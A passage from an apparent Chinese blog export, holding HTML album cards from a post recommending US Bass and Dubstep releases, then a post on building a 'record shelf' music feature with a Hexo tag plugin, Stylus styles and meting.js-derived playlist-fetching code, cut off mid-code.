    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="148312465" data-server="netease" data-type="album">THE EP</p>
      <p class="author">Loompaskettee</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="148312465" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="148312465" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  
</div>


<h2 id="圆桌"><a href="#圆桌" class="headerlink" title="圆桌"></a>圆桌</h2><div class="music-list">

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251547906.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">Bass x HDM的快乐</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="152982829" data-server="netease" data-type="album">Ravolution EP</p>
      <p class="author">Graphyt</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="152982829" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="152982829" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251551659.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">至少我个人真的很喜欢薯片弹簧般的音色，听了他后才理解了Riddim Dubstep的爽点</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="140767376" data-server="netease" data-type="album">Pentagon EP</p>
      <p class="author">Chibs</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="140767376" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="140767376" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251553757.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">来自法国的精神维京人和他取材自北欧神话的佳作</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="123748486" data-server="netease" data-type="album">Loki EP</p>
      <p class="author">Samplifire</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="123748486" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="123748486" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  

  <div class="music-item">
      <div class="pic-item">
        <img class="cover" src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306251549072.jpg?x-oss-process=image/resize,s_300">
        <div class="inner">
        </div>
        <img no-lazy src= "/img/loading.gif" data-lazy-src="/img/vinyl.png" class="vinyl no-lightbox">
        <div class="description">
      <p class="des-inner">圆桌boy超级大猩猩和他的丛林烧flow</p>
    </div>
    
      </div>
      <p class="title music-to-site" title="去平台" data-id="144712624" data-server="netease" data-type="album">Embrace EP</p>
      <p class="author">BeutNoise</p>
      <div class="music-play-btns">
        <button class="music-play-btn play-album" data-id="144712624" data-server="netease" data-type="album">播放专辑</button>
        <button class="music-play-btn add-album" data-id="144712624" data-server="netease" data-type="album">添至列表</button>
      </div>
    </div>
  
</div>


<h2 id="其他（？）"><a href="#其他（？）" class="headerlink" title="其他（？）"></a>其他（？）</h2><p><del><a href="https://www.bilibili.com/video/BV1wt411r7Gu">Disciple一群做电音的大佬们居然跑来唱歌？</a></del></p>
<p><a href="https://www.bilibili.com/video/BV1QT4y1J7hU?vd_source=abff2190dd215e2033f2ec57123dd1d6">Disciple - We Don’t Play 歌词版MV</a></p>
<h1 id="Disciple听够了，然后呢？"><a href="#Disciple听够了，然后呢？" class="headerlink" title="Disciple听够了，然后呢？"></a>Disciple听够了，然后呢？</h1><p>如果你真的被我拉入了坑，我首先跪下来感谢你（</p>
<p>虽然接近两千首歌还是有点多的，但也总有听完的一天，也总有热情退却的一天，是吧</p>
<p>如果你已经不满足于Disciple，想了解更多的US Bass，那我这边推荐以下路线：</p>
<h2 id="路线1：继续主流鲈鱼之旅"><a href="#路线1：继续主流鲈鱼之旅" class="headerlink" title="路线1：继续主流鲈鱼之旅"></a>路线1：继续主流鲈鱼之旅</h2><p>上文有提到，其实倒闭前的Never Say Die（简称NSD）以及它的子厂牌Never Say Die: Black Label（简称黑牌）才是地表最强Bass厂<del>，地赛破长时间属于老二</del></p>
<p>甚至在一开始，Disciple其实就是NSD的子厂牌，只不过因为种种原因，Disciple独立出去还成了竞争对手</p>
<p>总体而言，NSD在US Bass的影响力和贡献<del>以及作品平均质量</del>各方面都胜过Disciple</p>
<p>但因为管理层不稳定和财政亏损的原因，结果还是倒闭了，高口碑高地位都没能挽救这一切<del>，更加证明了万物离不开营销</del></p>
<p>如果你觉得主流Dubstep不错，想多听一点，那么一定要尝试NSD和黑牌！绝对不会让你失望的！</p>
<p>如果你对附加价值策略很感冒的话也可以听听Monstercat Uncaged，Monstercat作为主流多风格厂牌，最大的价值就是作为引路人，让你发现”原来还有这种音乐！“，进而让人们自取所好地深入并接触其他厂牌<del>，而且Monstercat真的很爱玩人设营销</del></p>
<h2 id="路线2：听点色的，斯哈斯哈"><a href="#路线2：听点色的，斯哈斯哈" class="headerlink" title="路线2：听点色的，斯哈斯哈"></a>路线2：听点色的，斯哈斯哈</h2><p>除了主流Dubstep外，近几年非常火（所以这个也叫主流）的一种音乐概念Colour Bass，也可以尝试尝试</p>
<p>其实它不是一种风格，而是一种音色元素，但它的命名者Dubstep制作人，且人们多以Dubstep形式制作Colour Bass作品，所以可以说它和Dubstep密切相关</p>
<p>那在这个Colour Bass场景里，Disciple就真的起到重要推动了！<del>地赛破为数不多的闪光时刻！</del></p>
<p>Disciple的Afterlife系列，几乎是Colour Bass领域的必听之作<del>，但它截至目前也只出了两弹</del></p>
<p>另外，盯紧英国小可爱Chime，他参与开发并命名了Colour Bass，并创立了自己的厂牌Rushdown以对此进行推广，所以Rushdown就是Colour Bass的代表厂牌<del>，虽然目前暂停运营中</del></p>
<p>Chime曾经多次在Disciple发表作品，在这里你也可以听到Colour Bass的一些雏形哦</p>
<h2 id="路线3：如何做个鲈鱼亚比"><a href="#路线3：如何做个鲈鱼亚比" class="headerlink" title="路线3：如何做个鲈鱼亚比"></a>路线3：如何做个鲈鱼亚比</h2><p>觉得主流Dubstep和Colour Bass不够怪？那咱US Bass确实也有怪的给你吃</p>
<p>隆重向你介绍一种与Colour Bass有一定交集的US Bass风格——Future Riddim！</p>
<p>Future Riddim注重旋律，从概念上看和Melodic Riddim差不多，但实际场景中还是出现了一些区别</p>
<p>最显而易见的就是，Future Riddim经常被融入了一些10年代互联网亚比文化的元素，主要是融入了网络音乐，有时还会有网络视觉，如果给你三个字形容Future Riddim和主流US Bass的区别，那一定是”有点怪“</p>
<p>咱们Disciple是主流厂，亚比玩意真不算多，但你也可以像了解Chime和Colour Bass一样，盯紧Oolacile，他和他的厂牌Halcyon就是Future Riddim的主要推动者，试试从他在Disciple发的歌过渡到他离开Disciple后发的歌以及Halcyon吧</p>
<p>顺便一提，Rushdown的歌不一定是Colour Bass，Halcyon的歌也不一定是Future Riddim</p>
<h2 id="路线4：追根溯源，回到英国"><a href="#路线4：追根溯源，回到英国" class="headerlink" title="路线4：追根溯源，回到英国"></a>路线4：追根溯源，回到英国</h2><p>上文也提到过US Bass发源自UK Bass，那么Disciple有没有接纳过UK Bass？那还是有一点的嘛</p>
<p>2018年左右的Disciple其实没有现在的Disciple那样过于严格地限制风格，甚至还签约了一些曾经活跃于UK Bass场景的制作人：Hatcha、Truth、The Others</p>
<p>当然这个Hatcha更是重量级，如果你去查找他的资料，你会发现Big Apple唱片店，以及他以前经常发歌的Tempa厂牌，那么恭喜你，你发现了Dubstep最重要的起源场景，由此开始你的溯源之旅吧~</p>
<p>如果你想了解一下Dubstep的烈性化美国化进程，也可以听一听被誉为“Dubstep教父”的12th Planet哦</p>
<p>当然我对UK Bass的了解还只停留在很浅的层次，在此就不故弄玄虚了orz（<del>其实我对US Bass的了解也挺浅的</del></p>
<h2 id="路线0：没有路线，或者处处都是路线"><a href="#路线0：没有路线，或者处处都是路线" class="headerlink" title="路线0：没有路线，或者处处都是路线"></a>路线0：没有路线，或者处处都是路线</h2><p>听歌嘛，只是作为一种爱好的话，那就是讲究一个怎么舒服怎么来</p>
<p>虽然这篇文章主要的出发点是安利Disciple和US Bass，但其实，何必拘泥于US Bass呢</p>
<p>多听不同的音乐，虽然不能帮你多赚几个钱，但是帮你拓宽一下欣赏广度，不也挺好的吗~</p>
<p>挖歌通常遵循一个链式反应搜索：从一首你喜欢的歌出发，可以扩展到这个歌的所有staff做的歌，可以扩展到这个厂牌的所有歌，甚至可以打听一下这首歌的流派风格并寻找其他相似的歌</p>
<p>这样一来，你所可能接触到的歌的数量就呈指数级上升了！从此再也不歌荒！</p>
]]></content>
      <categories>
        <category>EDM</category>
      </categories>
      <tags>
        <tag>爱好</tag>
        <tag>安利</tag>
        <tag>EDM</tag>
      </tags>
  </entry>
  <entry>
    <title>我制作了一个唱片架</title>
    <url>/web/diy/1.%E6%88%91%E5%88%B6%E4%BD%9C%E4%BA%86%E4%B8%80%E4%B8%AA%E5%94%B1%E7%89%87%E6%9E%B6.html</url>
    <content><![CDATA[<p>因为我很喜欢听音乐（尤其是电子音乐），所以我希望我自己的博客能给浏览者安利很多很多好听的音乐。</p>
<p>总感觉这个全局吸底aplayer如果只能播一个歌单的话太浪费了。我希望它能像家里摆着的唱片机一样，当客人来做客时，任他在唱片架挑选中意的唱片，并放进这个唱片机里开始聆听。</p>
<p>虽然我是技术渣，但还是想试试。</p>
<h1 id="乐辑"><a href="#乐辑" class="headerlink" title="乐辑"></a>乐辑</h1><p>这里直接照搬了butterfly主题中图册页的样式和标签插件（确实很好看），就不赘述了。</p>
<p>收藏的唱片一多，确实就需要对唱片架中的唱片进行归类。</p>
<h1 id="唱片架"><a href="#唱片架" class="headerlink" title="唱片架"></a>唱片架</h1><p>一定程度上参考了butterfly的图片页。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>大概长这样：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305011601485.png"></p>
<p>当鼠标移至唱片封面时，会出现个人的<del>吐槽</del>评价，以及黑胶唱片被拿出的效果。</p>
<p>点击下方的播放，底部aplayer的播放列表就会变成这个唱片的曲目啦。</p>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>为了方便日后使用，干脆做成一个标签插件。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * AuroraCafe</span></span><br><span class="line"><span class="comment"> * musicGroup and musicItem</span></span><br><span class="line"><span class="comment"> * &#123;% musicGroup [name] [descr] [url] [img] %&#125;</span></span><br><span class="line"><span class="comment"> * &#123;% musicItem [cover] [title] [author] [id] [server] [type] [description] %&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> urlFor = <span class="built_in">require</span>(<span class="string">&#x27;hexo-util&#x27;</span>).<span class="property">url_for</span>.<span class="title function_">bind</span>(hexo)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * musicGroup省略</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">musicItem</span>(<span class="params">args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> cover = args[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">const</span> title = args[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">const</span> author = args[<span class="number">2</span>]</span><br><span class="line">  <span class="keyword">const</span> id = args[<span class="number">3</span>]</span><br><span class="line">  <span class="keyword">const</span> server = args[<span class="number">4</span>]</span><br><span class="line">  <span class="keyword">const</span> type = args[<span class="number">5</span>]</span><br><span class="line">  <span class="keyword">const</span> description = args[<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> extraHTML = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">if</span>(description &amp;&amp; <span class="title function_">typeof</span>(description)!==<span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">    extraHTML = <span class="string">`&lt;div class=&quot;description&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;p class=&quot;des-inner&quot;&gt;<span class="subst">$&#123;description&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;music-item&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;pic-item&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;img class=&quot;cover no-lightbox&quot; src=&quot;<span class="subst">$&#123;cover&#125;</span>?x-oss-process=image/resize,s_300&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;inner&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img no-lazy src=&quot;/img/vinyl.png&quot; class=&quot;vinyl no-lightbox&quot;&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;extraHTML&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;p class=&quot;title&quot;&gt;<span class="subst">$&#123;title&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;p class=&quot;author&quot;&gt;<span class="subst">$&#123;author&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;button class=&quot;music-play-btn&quot; data-id=&quot;<span class="subst">$&#123;id&#125;</span>&quot; data-server=&quot;<span class="subst">$&#123;server&#125;</span>&quot; data-type=&quot;<span class="subst">$&#123;type&#125;</span>&quot;&gt;播放&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hexo.extend.tag.register(&#x27;musicGroup&#x27;, musicGroup)</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">tag</span>.<span class="title function_">register</span>(<span class="string">&#x27;musicItem&#x27;</span>, musicItem)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><p>在<code>/source/css/tags</code>中创建了<code>musicItem.styl</code>，用于唱片架样式。</p>
<blockquote>
<p>别忘了引入到总样式文件里。</p>
</blockquote>
<p>每一个唱片是<code>.music-item</code>，一个唱片架就是<code>.music-list</code>。</p>
<blockquote>
<p>老实说我还是比较习惯scss的写法，stylus让我觉得好别扭orz。</p>
</blockquote>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#article-container</span></span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.music-list</span> </span><br><span class="line">    <span class="attribute">display</span>: grid;</span><br><span class="line">    <span class="attribute">grid-template-columns</span>: <span class="number">1</span>fr <span class="number">1</span>fr;</span><br><span class="line">    <span class="attribute">grid-row</span>-gap: <span class="number">1.5rem</span>;</span><br><span class="line">    justify-items: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">2rem</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">500px</span>)</span><br><span class="line">      &amp;</span><br><span class="line">        grid-template-columns: <span class="number">1</span>fr;</span><br><span class="line"></span><br><span class="line">    <span class="selector-class">.music-item</span> </span><br><span class="line">      <span class="attribute">width</span>: <span class="number">14rem</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">18rem</span>;</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">0.5rem</span>;</span><br><span class="line">      <span class="attribute">display</span>: flex;</span><br><span class="line">      <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    </span><br><span class="line">      <span class="selector-class">.pic-item</span> </span><br><span class="line">        <span class="attribute">position</span>: relative;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">12rem</span>;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">12rem</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="selector-class">.cover</span> </span><br><span class="line">          <span class="attribute">width</span>: <span class="number">12rem</span>;</span><br><span class="line">          <span class="attribute">height</span>: <span class="number">12rem</span>;</span><br><span class="line">          <span class="attribute">border-radius</span>: <span class="number">0.5rem</span>;</span><br><span class="line">          <span class="attribute">position</span>: absolute;</span><br><span class="line">          <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">          <span class="attribute">transition</span>: <span class="number">0.1s</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="selector-class">.inner</span> </span><br><span class="line">          <span class="attribute">width</span>: <span class="number">11.5rem</span>;</span><br><span class="line">          <span class="attribute">height</span>: <span class="number">11.5rem</span>;</span><br><span class="line">          <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">3</span>);</span><br><span class="line">          <span class="attribute">border-radius</span>: <span class="number">1rem</span>;</span><br><span class="line">          <span class="attribute">position</span>: absolute;</span><br><span class="line">          <span class="attribute">top</span>: <span class="number">0.25rem</span>;</span><br><span class="line">          <span class="attribute">left</span>: <span class="number">1.25rem</span>;</span><br><span class="line">          <span class="attribute">transition</span>: <span class="number">0.1s</span>;</span><br><span class="line">          <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="selector-class">.vinyl</span> </span><br><span class="line">          <span class="attribute">width</span>: <span class="number">12rem</span>;</span><br><span class="line">          <span class="attribute">height</span>: <span class="number">12rem</span>;</span><br><span class="line">          <span class="attribute">position</span>: absolute;</span><br><span class="line">          <span class="attribute">background-color</span>: transparent;</span><br><span class="line">          <span class="attribute">left</span>: <span class="number">1.5rem</span>;</span><br><span class="line">          <span class="attribute">transition</span>: <span class="number">0.1s</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="selector-class">.description</span> </span><br><span class="line">          <span class="attribute">visibility</span>: hidden;</span><br><span class="line">          <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">          <span class="attribute">width</span>: <span class="number">12rem</span>;</span><br><span class="line">          <span class="attribute">height</span>: <span class="number">12rem</span>;</span><br><span class="line">          <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">5</span>);</span><br><span class="line">          <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">          <span class="attribute">border-radius</span>: <span class="number">0.5rem</span>;</span><br><span class="line">          <span class="attribute">overflow</span>: hidden;</span><br><span class="line">          <span class="attribute">position</span>: absolute;</span><br><span class="line">          <span class="attribute">transition</span>: <span class="number">0.1s</span>;</span><br><span class="line">          <span class="attribute">z-index</span>: <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">          <span class="selector-class">.des-inner</span> </span><br><span class="line">            <span class="attribute">width</span>: <span class="number">12rem</span>;</span><br><span class="line">            <span class="attribute">height</span>: <span class="number">12rem</span>;</span><br><span class="line">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">            <span class="attribute">padding</span>: <span class="number">0.5rem</span>;</span><br><span class="line">            <span class="attribute">border-radius</span>: <span class="number">0.5rem</span>;</span><br><span class="line">            <span class="attribute">font-size</span>: <span class="number">0.8rem</span>;</span><br><span class="line">            <span class="attribute">letter-spacing</span>: <span class="number">0.05rem</span>;</span><br><span class="line">            <span class="attribute">line-height</span>: <span class="number">1.1rem</span>;</span><br><span class="line">            <span class="attribute">text-indent</span>: <span class="number">1.6rem</span>;</span><br><span class="line">            <span class="attribute">overflow-y</span>: scroll;</span><br><span class="line">            <span class="attribute">transition</span>: <span class="number">0.1s</span>;</span><br><span class="line">            <span class="attribute">z-index</span>: <span class="number">5</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="selector-pseudo">&amp;:hover</span> </span><br><span class="line">          <span class="selector-class">.vinyl</span> </span><br><span class="line">            <span class="attribute">left</span>: <span class="number">3.5rem</span>;</span><br><span class="line">    </span><br><span class="line">          <span class="selector-class">.cover</span> </span><br><span class="line">            <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>) <span class="number">0px</span> <span class="number">5px</span> <span class="number">15px</span>;</span><br><span class="line">          </span><br><span class="line">          <span class="selector-class">.inner</span> </span><br><span class="line">            <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>) <span class="number">0px</span> <span class="number">5px</span> <span class="number">15px</span>;</span><br><span class="line"></span><br><span class="line">          <span class="selector-class">.description</span></span><br><span class="line">            <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">            <span class="attribute">visibility</span>: visible;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">      <span class="selector-tag">p</span> </span><br><span class="line">        <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">        <span class="attribute">cursor</span>: default;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">      <span class="selector-class">.title</span> </span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">        <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">        <span class="attribute">word-break</span>: break-all;</span><br><span class="line">        <span class="attribute">overflow</span>: hidden;</span><br><span class="line">        <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">0.5rem</span>;</span><br><span class="line">  </span><br><span class="line">      <span class="selector-class">.author</span> </span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">0.8rem</span>;</span><br><span class="line">        <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">        <span class="attribute">word-break</span>: break-all;</span><br><span class="line">        <span class="attribute">overflow</span>: hidden;</span><br><span class="line">        <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">      <span class="selector-tag">button</span> </span><br><span class="line">        <span class="attribute">border</span>: none;</span><br><span class="line">        <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">        <span class="attribute">padding</span>: <span class="number">0.25rem</span></span><br><span class="line">        <span class="attribute">border-radius</span>: <span class="number">1rem</span>;</span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">0.5rem</span>;</span><br><span class="line">        <span class="attribute">transition</span>: <span class="number">0.1s</span>;</span><br><span class="line">        <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>) <span class="number">0px</span> <span class="number">4px</span> <span class="number">12px</span>;</span><br><span class="line">        <span class="selector-pseudo">&amp;:hover</span> </span><br><span class="line">          <span class="attribute">cursor</span>: pointer;</span><br><span class="line">          <span class="attribute">box-shadow</span>: <span class="built_in">rgba</span>(<span class="number">50</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">0.25</span>) <span class="number">0px</span> <span class="number">2px</span> <span class="number">5px</span> -<span class="number">1px</span>, <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.3</span>) <span class="number">0px</span> <span class="number">1px</span> <span class="number">3px</span> -<span class="number">1px</span>;</span><br></pre></td></tr></table></figure>

<h2 id="行为"><a href="#行为" class="headerlink" title="行为"></a>行为</h2><p>在<code>/source/js</code>中创建了<code>changePlay.js</code>，用于唱片架样式。</p>
<blockquote>
<p>其实也就点击播放后切换播放列表这一个行为。</p>
</blockquote>
<p>查阅了其他人的一些博客，各位推介的最佳实践都是使用meting.js对aplayer进行增强，这样只要输入几个参数就能获取整个网络音乐平台的播放列表，不需要自己想办法获得音乐的api。就像这样：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meting-js</span> <span class="attr">server</span>=<span class="string">&quot;netease&quot;</span> <span class="attr">type</span>=<span class="string">&quot;album&quot;</span> <span class="attr">id</span>=<span class="string">&quot;154548341&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是这样并不符合我的要求，因为当我查阅meting.js的文档时，我发现一个问题：meting.js仿佛是一个完全的黑箱操作，它好像没有提供任何透露流程细节的API，我只能输入几个参数看着它自己在网页的该位置生成一个aplayer播放器。</p>
<blockquote>
<p>这明显不符合我的需求，我希望操作博客已有的全局吸底播放器，而不是生成一个新播放器。</p>
</blockquote>
<p>于是我查看了meting.js的源码，从其中摘取了一段核心代码，并另写了一个普通的函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getMusicList</span> = <span class="keyword">async</span> (<span class="params">options</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> (options) !== <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> api</span><br><span class="line">  <span class="keyword">let</span> result</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化</span></span><br><span class="line">  <span class="title function_">init</span>()</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">parse</span>()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">    api =</span><br><span class="line">      options.<span class="property">api</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">meting_api</span> ||</span><br><span class="line">      <span class="string">&#x27;https://api.i-meto.com/meting/api?server=:server&amp;type=:type&amp;id=:id&amp;r=:r&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">auto</span>) <span class="title function_">_parse_link</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_parse_link</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> rules = [</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*song.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;song&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*album.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;album&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*artist.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;artist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*playlist.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;music.163.com.*discover/toplist.*id=(\\d+)&#x27;</span>, <span class="string">&#x27;netease&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*song/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;song&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*album/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;album&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*singer/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;artist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*playsquare/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;y.qq.com.*playlist/(\\w+).html&#x27;</span>, <span class="string">&#x27;tencent&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*song/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;song&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*album/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;album&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*artist/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;artist&#x27;</span>],</span><br><span class="line">        [<span class="string">&#x27;xiami.com.*collect/(\\w+)&#x27;</span>, <span class="string">&#x27;xiami&#x27;</span>, <span class="string">&#x27;playlist&#x27;</span>],</span><br><span class="line">      ]</span><br><span class="line"></span><br><span class="line">      <span 